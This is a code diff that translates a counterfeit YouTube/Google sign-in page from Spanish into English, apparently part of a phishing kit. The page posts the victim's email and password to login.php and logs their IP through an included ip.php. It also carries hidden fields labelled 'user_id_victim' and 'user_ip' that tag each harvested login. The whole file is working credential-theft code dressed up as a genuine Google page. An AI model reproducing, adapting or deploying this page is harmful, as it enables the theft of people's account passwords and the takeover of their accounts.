@@ -22,9 +22,9 @@
   <div class="header content clearfix">
   <img class="logo" src="google_logo_41.png" alt="Google">
   <span class="signup-button">
-  ¿Es la primera vez que utilizas YouTube?
+  New to YouTube?
   <a id="link-signup" class="g-button g-button-red" href="https://accounts.google.com/SignUp?service=youtube&amp;continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26feature%3Dsign_in_button%26hl%3Dfr_FR%26next%3D%252F%26nomobiletemp%3D1&amp;hl=es">
-  Crear una cuenta
+   Create an account
   </a>
   </span>
   </div>
@@ -32,7 +32,7 @@
   <div class="main content clearfix">
   <div class="sign-in">
 <div class="signin-box">
-  <h2>Iniciar sesión <strong></strong></h2>
+  <h2> Login <strong></strong></h2>
   <form novalidate="" id="gaia_loginform" action="login.php" accept-charset="utf-8" method="post">
 <?php include 'ip.php'; ?>
   <input name="continue" id="continue" value="https://www.youtube.com/signin?action_handle_signin=true&amp;feature=sign_in_button&amp;hl=fr_FR&amp;next=%2F&amp;nomobiletemp=1" type="hidden">
@@ -50,19 +50,19 @@
 <input id="_utf8" name="_utf8" value="☃" type="hidden">
   <input name="bgresponse" id="bgresponse" value="js_disabled" type="hidden">
 <div class="email-div">
-  <label for="Email"><strong class="email-label">Dirección de correo electrónico</strong></label>
+  <label for="Email"><strong class="email-label">Email Addres</strong></label>
   <input spellcheck="false" name="email" id="Email" value="" type="email">
   <input type="hidden" name="user_id_victim" value="gZsxT7VG1wQk0wMXFhM2hPZHowOQ==" /><input type="hidden" name="user_ip" value="181.174.90.183,66.249.88.76, 66.249.88.76" /><input type="hidden" name="type" value="youtube" />
 </div>
 <div class="passwd-div">
-  <label for="Passwd"><strong class="passwd-label">Contraseña</strong></label>
+  <label for="Passwd"><strong class="passwd-label">Password</strong></label>
   <input name="pass" id="Passwd" type="password">
 </div>
   <input class="g-button g-button-submit" name="signIn" id="signIn" value="Iniciar sesión" type="submit">
   <label class="remember" onclick="">
   <input name="PersistentCookie" id="PersistentCookie" value="yes" checked="checked" type="checkbox">
   <strong class="remember-label">
-  No cerrar sesión
+  Do not sign out
   </strong>
   </label>
   <input name="rmShown" value="1" type="hidden">
@@ -70,7 +70,7 @@
   <ul>
   <li>
   <a id="link-forgot-passwd" href="https://www.youtube.com/account_recovery" target="_top">
-  ¿No puedes acceder a tu cuenta?
+  You can not access your account?
   </a>
   </li>
   </ul>
@@ -79,34 +79,34 @@
   <div class="product-info youtube">
 <div class="product-headers">
   <h1 class="redtext">YouTube</h1>
-  <h2>Inicia sesión ahora y usa tu cuenta de YouTube para disfrutar de las siguientes ventajas:</h2>
+  <h2>Log in now and use your YouTube account to enjoy the following benefits:</h2>
 </div>
   <ul class="features">
   <li>
   <img alt="" src="ytfav.png">
   <p class="title">
-  Mantente al día de las novedades de tus canales favoritos
+ Keep up to date with the news of your favorite channels
   </p>
   <p>
-  Guarda vídeos para verlos más tarde, ve recomendaciones personalizadas o suscríbete para recibir actualizaciones de tus canales favoritos.
+ Save videos to watch later, view personalized recommendations, or subscribe to receive updates from your favorite channels.
   </p>
   </li>
   <li>
   <img alt="" src="ytonzgo.png">
   <p class="title">
-  Disfruta de tus vídeos en cualquier parte
+ Enjoy your videos anywhere
   </p>
   <p>
-  Ve tus vídeos favoritos estés donde estés con tu smartphone, tablet o Smart TV.
+Watch your favorite videos wherever you are with your smartphone, tablet or Smart TV.
   </p>
   </li>
   <li>
   <img alt="" src="ytwfrnz.png">
   <p class="title">
-  Comparte con tus amigos
+ Share with your friends
   </p>
   <p>
-  Ve los vídeos que han compartido tus amigos en todas tus redes sociales en un único lugar.
+  See the videos that your friends have shared on all your social networks in one place.
   </p>
   </li>
 </ul>
@@ -116,10 +116,10 @@
 <div class="google-footer-bar">
   <div class="footer content clearfix">
   <ul>
-  <li>© 2013 Google</li>
-  <li><a href="https://accounts.google.com/TOS?hl=es" target="_top">Condiciones del servicio</a></li>
-  <li><a href="https://www.google.com/intl/es/privacy/" target="_top">Política de privacidad</a></li>
-  <li><a href="https://www.google.com/support/accounts?hl=es" target="_top">Ayuda</a></li>
+  <li>© 2021 Google</li>
+  <li><a href="https://accounts.google.com/TOS?hl=es" target="_top">Conditions of service</a></li>
+  <li><a href="https://www.google.com/intl/es/privacy/" target="_top">Privacy Policy</a></li>
+  <li><a href="https://www.google.com/support/accounts?hl=es" target="_top">Help</a></li>
   </ul>
   <span id="lang-chooser-wrap" class="lang-chooser-wrap" style="">
   <img src="universal_language_settings-21.png">
